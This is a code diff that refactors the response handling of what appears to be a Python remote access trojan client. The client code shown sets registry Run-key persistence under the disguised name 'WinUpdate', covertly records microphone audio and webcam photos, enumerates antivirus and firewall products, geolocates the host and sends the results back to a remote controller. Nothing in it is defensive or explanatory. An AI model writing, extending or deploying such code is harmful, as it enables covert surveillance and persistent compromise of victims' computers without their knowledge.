@@ -22,6 +22,10 @@ from plyer import notification
 from cryptography.fernet import Fernet
 from colorama import Fore, Style
 
+class STATUS:
+    SUCCESS = "success"
+    FAILURE = "failure"
+
 KEY = 'RANDOM_KEY'
 
 _k = KEY.encode() if isinstance(KEY, str) else KEY
@@ -36,6 +40,22 @@ fileName = "app.exe"
 use_app = False
 
 time_value = 90
+
+task_id = 0
+
+def prepare_response(status=STATUS.SUCCESS, result=None, error=None, metadata=None):
+    response = {"status": status, "task_id": task_id}
+    if result is not None:
+        response["result"] = result
+    if error is not None:
+        response["error"] = error
+    if metadata is not None:
+        response["metadata"] = metadata
+    return response
+
+def send_response(conn, status=STATUS.SUCCESS, result=None, error=None, metadata=None):
+    response = prepare_response(status, result, error, metadata)
+    json_send(conn, response)
 
 def encrypt(data): return fernet.encrypt(data)
 def decrypt(data): return fernet.decrypt(data)
@@ -78,7 +98,8 @@ def get_system_info(conn):
         }
     except Exception as e:
         info = str(e)
-    json_send(conn, info)
+
+    send_response(conn, status=STATUS.SUCCESS, result=info)
 
 def get_security_info(conn):
     c = wmi.connect(namespace="root/SecurityCenter2")
@@ -90,7 +111,7 @@ def get_security_info(conn):
     antivirus_info = [{"displayName": a.displayName, "instanceGuid": a.instanceGuid, 
                       "pathToSignedProductExe": a.pathToSignedProductExe , "pathToSignedReportingExe": a.pathToSignedReportingExe,
                       "productState": a.productState, "timestamp": a.timestamp} for a in antivirus]
-    json_send(conn, {"Firewall": firewall_info, "Antivirus": antivirus_info})
+    send_response(conn, status=STATUS.SUCCESS, result={"Firewall": firewall_info, "Antivirus": antivirus_info})
 
 def del_persistence(conn):
     try:
@@ -104,7 +125,7 @@ def del_persistence(conn):
         winreg.CloseKey(key)
         target = os.path.join(os.environ["APPDATA"], "WinUpd.exe")
         os.remove(target)
-        send_data(conn , b'completed')
+        send_response(conn, status=STATUS.SUCCESS)
     except:pass
 
 def add_persistence(conn):
@@ -116,7 +137,7 @@ def add_persistence(conn):
                              r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, "WinUpdate", 0, winreg.REG_SZ, target)
         winreg.CloseKey(key)
-        send_data(conn, b'completed')
+        send_response(conn, status=STATUS.SUCCESS)
     except: pass
 
 def send_data(conn, data: bytes):
@@ -174,9 +195,9 @@ def handle_mic(conn):
         wav_file = io.BytesIO()
         wavio.write(wav_file, rec, fs, sampwidth=2)
         if wav_file.getvalue():
-            send_data(conn, wav_file.getvalue())
+            send_response(conn, status=STATUS.SUCCESS, result=wav_file.getvalue())
     except:
-        send_data(conn, b'Error')
+        send_response(conn, status=STATUS.FAILURE, error="[-] Error recording audio")
 
 def handle_upload(conn, getName=False):
     try: 
@@ -198,16 +219,18 @@ def handle_cam(conn):
         cap.release()
         if ret:
             _, jpeg = cv2.imencode('.jpg', frame)
-            send_data(conn, jpeg.tobytes())
+            send_response(conn, status=STATUS.SUCCESS, result=jpeg.tobytes())
         else:
-            send_data(conn, b'[-] Failed')
-    except: send_data(conn, b'[-] Error Take Photo')
+            send_response(conn, status=STATUS.FAILURE, error="[-] Failed to take photo")
+    except Exception as e:
+        send_response(conn, status=STATUS.FAILURE, error="[-] Error taking photo")
 
 def handle_geo(conn):
     try:
         r = requests.get('https://ipinfo.io/json')
-        send_data(conn, r.text.encode())
-    except: send_data(conn, b'[-] Failed To Get Location')
+        send_response(conn, status=STATUS.SUCCESS, result=r.text)
+    except Exception as e:
+        send_response(conn, status=STATUS.FAILURE, error="[-] Failed to get location")
 
 def run(filename):
     if getattr(sys, "frozen", False):
@@ -451,6 +474,8 @@ class Exploit:
 exploit = Exploit()
 
 def main():
+    global task_id
+    task_id = 0
     startup_executed = False
     while True:
         if not startup_executed:
@@ -472,6 +497,7 @@ def main():
                         if isinstance(task_obj, dict) and 'module' in task_obj:
                             module = task_obj.get('module')
                             action = task_obj.get('action')
+                            task_id = task_obj.get('task_id')
                             args = task_obj.get('args', {}) or {}
                             if module == 'notification' and action == 'send':
                                 send_notification(s, args.get('title'), args.get('message'), args.get('app'))
@@ -479,9 +505,9 @@ def main():
                             if module == 'geo' and action == 'get':
                                 try:
                                     r = requests.get('https://ipinfo.io/json')
-                                    json_send(s, {'result': r.text})
-                                except:
-                                    json_send(s, {'error': 'failed'})
+                                    send_response(s, status=STATUS.SUCCESS, result={'result': r.text})
+                                except Exception as e:
+                                    send_response(s, status=STATUS.FAILURE, error="[-] Failed to get location")
                                 continue
                             if module == 'secinfo' and action == 'get':
                                 get_security_info(s)
